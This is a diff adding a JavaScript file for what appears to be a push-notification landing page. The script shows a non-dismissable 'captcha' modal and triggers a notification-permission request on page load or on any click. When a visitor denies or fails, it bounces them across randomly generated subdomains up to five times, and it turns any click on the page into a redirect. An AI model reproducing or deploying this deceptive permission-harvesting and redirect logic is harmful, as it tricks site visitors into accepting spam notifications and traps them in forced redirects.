@@ -1,0 +1,302 @@
+//let lang=window.navigator.languages?window.navigator.languages[0]:null;void 0===(lang=lang||window.navigator.language||window.navigator.browserLanguage||window.navigator.userLanguage)&&(lang="en");let shortLang=lang;-1!==shortLang.indexOf("-")&&(shortLang=shortLang.split("-")[0]),-1!==shortLang.indexOf("_")&&(shortLang=shortLang.split("_")[0]),void 0===shortLang&&(shortLang="en"),$.i18n.messageStore.find(shortLang)?$.i18n({locale:shortLang}):$.i18n({locale:"en"}),$("body").i18n();var e=function(){void 0!==this.requestFullScreen?this.requestFullScreen():void 0!==this.webkitRequestFullScreen?this.webkitRequestFullScreen():void 0!==this.mozRequestFullScreen&&this.mozRequestFullScreen()};
+
+
+
+function rl(tp,url,nocapcha=0)
+{
+
+
+
+    if (tp == 'failed' || tp == 'deny'|| tp == 'asubscribed')
+    {
+        const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+
+
+
+        var n = 0;
+        if (urlParams.get('mcount') !== null)
+            n=parseInt(urlParams.get('mcount'));
+
+
+        if(++n<5)
+        {
+            var names = ["581358","qwwnvw","xn4iqv","izjec2","ixzc4t","invv7n","bdhze4","xiiowt","qyt8pi","37yito","0wvghk","mkhvuv","vjr2ws","fjvv2i","rgx54z","hzgsp3","nze0xw","kxkxgw","2ntrfi","hyjecr"];
+            var random = Math.floor(Math.random() * names.length);
+            let e=window.location.hostname,o=e.split(".");
+if (names.includes(o[0]))
+{
+    o[0] = names[random];
+    var t = '//'+o.join('.')+window.location.pathname;
+}
+else
+{
+    var t = '//'+names[random]+'.'+o.join('.')+window.location.pathname;
+}
+console.log(t);
+//            o.length==3&&(e=o[1]+"."+o[2]);
+//            o.length==4&&(e=o[2]+"."+o[3]);
+            
+            //console.log(e);
+            //console.log(o);
+
+            
+//            if ( e == 'co.in' && o.length == 3){
+//              e = o[0] + "." + e;
+//            }
+//            if ( e == 'co.in' && o.length == 4){
+//              e = o[1] + "." + e;
+//            }
+
+//            let t="//"+names[random]+"."+e+window.location.pathname;
+            let nu = updateURLParameter(t+window.location.search,'mcount',n);
+            if (typeof landing_position !== 'undefined') {
+                nu = updateURLParameter(nu, 'lp', landing_position);
+            }
+
+            var nurl = new URL('https:' + nu);
+            nurl.searchParams.delete('bid');
+            nurl.searchParams.delete('cost');
+            nurl.searchParams.append('spayout_parse', 0);
+            nu = nurl;
+            
+            if (nocapcha == 0)
+            {
+ 
+
+                $('body').on('click', function() { 
+
+
+                window.location.href = nu;
+
+
+                });
+                if($('#captcha').length)
+                {
+                    //alert('capcha');
+        
+                    $('#captcha').modal({
+                        escapeClose: false,
+                        clickClose: false,
+                        showClose: false
+                    });
+                }
+
+                if( $('#captchahref').length)
+                {
+                    $("#captchahref").attr("href", nu);
+                }    
+            }
+            else
+            {
+
+                if (nu != '')
+                {
+                    window.location.replace(nu);
+                }                
+            }
+        }
+        else
+        {
+
+            if (url != '')
+            {
+                window.location.replace(url);
+            }
+        }
+        
+    }
+    else if (tp == 'allow')
+    {
+            if (url != '')
+            {
+                window.location.replace(url);
+            }       
+    }
+    
+    return false;
+}
+
+function updateURLParameter(url, param, paramVal)
+{
+    var TheAnchor = null;
+    var newAdditionalURL = "";
+    var tempArray = url.split("?");
+    var baseURL = tempArray[0];
+    var additionalURL = tempArray[1];
+    var temp = "";
+
+    if (additionalURL) 
+    {
+        var tmpAnchor = additionalURL.split("#");
+        var TheParams = tmpAnchor[0];
+            TheAnchor = tmpAnchor[1];
+        if(TheAnchor)
+            additionalURL = TheParams;
+
+        tempArray = additionalURL.split("&");
+
+        for (var i=0; i<tempArray.length; i++)
+        {
+            if(tempArray[i].split('=')[0] != param)
+            {
+                newAdditionalURL += temp + tempArray[i];
+                temp = "&";
+            }
+        }        
+    }
+    else
+    {
+        var tmpAnchor = baseURL.split("#");
+        var TheParams = tmpAnchor[0];
+            TheAnchor  = tmpAnchor[1];
+
+        if(TheParams)
+            baseURL = TheParams;
+    }
+
+    if(TheAnchor)
+        paramVal += "#" + TheAnchor;
+
+    var rows_txt = temp + "" + param + "=" + paramVal;
+    return baseURL + "?" + newAdditionalURL + rows_txt;
+}
+
+
+
+$(function() {
+
+
+    var redir = 0;
+
+    var browser_name = '';
+    var major_version = '';
+
+    var result = bowser.getParser(window.navigator.userAgent);
+    var browser_name = result.parsedResult.browser.name;
+    var major_version = result.parsedResult.browser.version.split(".")[0];
+    if (browser_name == 'Microsoft Edge' && major_version >= '107')
+    {
+        //alert(107);
+        document.body.addEventListener('click', function() {
+            //alert('click');
+            window.AltPushPush.requestSubscription();
+            window.pushOnSubscribed = function(url){return rl('allow', url,1);};
+            window.pushOnFailed = function(url){return rl('failed', url,1);};
+            window.pushOnAlreadySubscribed = function(url){return rl('asubscribed', url,1);};
+            window.pushOnDenied = function(url){return rl('deny', url,1);};
+            document.querySelector('.rightarrow').style.display = 'block';
+        });
+                    $('#captcha').modal({
+                    escapeClose: false,
+                    clickClose: true,
+                    showClose: true
+                });
+    }
+    else
+    {
+        //alert('no edge');
+        window.AltPushPush.requestSubscription();
+        window.pushOnSubscribed = function(url){return rl('allow', url);};
+        window.pushOnFailed = function(url){return rl('failed', url);};
+        window.pushOnAlreadySubscribed = function(url){return rl('asubscribed', url);};
+        window.pushOnDenied = function(url){return rl('deny', url);};
+
+        var redir = 1;
+    }
+
+
+
+
+let lang = window.navigator.languages ? window.navigator.languages[0] : null;
+        lang = lang || window.navigator.language || window.navigator.browserLanguage || window.navigator.userLanguage;
+
+    if (lang === undefined)
+        lang = 'en';
+
+    let shortLang = lang;
+    if (shortLang.indexOf('-') !== -1)
+        shortLang = shortLang.split('-')[0];
+
+    if (shortLang.indexOf('_') !== -1)
+        shortLang = shortLang.split('_')[0];
+
+    if (shortLang === undefined)
+        shortLang = 'en';
+
+
+    if ($.i18n.messageStore.find(shortLang))
+    {
+        $.i18n({
+            locale: shortLang
+        });
+    }
+    else
+    {
+        $.i18n({
+            locale: 'en' 
+        });
+    }
+
+    $( 'body' ).i18n();
+
+    const queryString = window.location.search;
+    const urlParams = new URLSearchParams(queryString);
+
+
+
+    var n = 0;
+    if (urlParams.get('mcount') !== null)
+    n=parseInt(urlParams.get('mcount'));
+
+
+    if(++n<5)
+    {
+        var names = ["581358","qwwnvw","xn4iqv","izjec2","ixzc4t","invv7n","bdhze4","xiiowt","qyt8pi","37yito","0wvghk","mkhvuv","vjr2ws","fjvv2i","rgx54z","hzgsp3","nze0xw","kxkxgw","2ntrfi","hyjecr"];
+        var random = Math.floor(Math.random() * names.length);
+        let e=window.location.hostname,o=e.split(".");
+if (names.includes(o[0]))
+{
+    o[0] = names[random];
+    var t = '//'+o.join('.')+window.location.pathname;
+}
+else
+{
+    var t = '//'+names[random]+'.'+o.join('.')+window.location.pathname;
+}
+    //o.length>2&&(e=o[1]+"."+o[2]);
+
+        //let t="//"+names[random]+"."+e+window.location.pathname;
+        let nu = updateURLParameter(t+window.location.search,'mcount',n);
+
+        if (typeof landing_position !== 'undefined') {
+            nu = updateURLParameter(nu, 'lp', landing_position);
+        }
+
+        var nurl = new URL('https:' + nu);
+        nurl.searchParams.delete('bid');
+        nurl.searchParams.delete('cost');
+        nurl.searchParams.append('spayout_parse', 0);
+        nu = nurl;
+
+        if (browser_name == 'Microsoft Edge' && major_version >= '107')
+        {
+            if (redir == 1)
+            {
+                //alert('second click bind');
+                $('body').on('click', function() { window.location.href = nu});
+            }
+        }
+        else
+        {
+            //alert('no edge second click bind');
+
+            $('body').on('click', function() { window.location.href = nu});
+        }
+        //$("#captchahref").attr("href", nu);
+        
+    }
+
+
+
+});
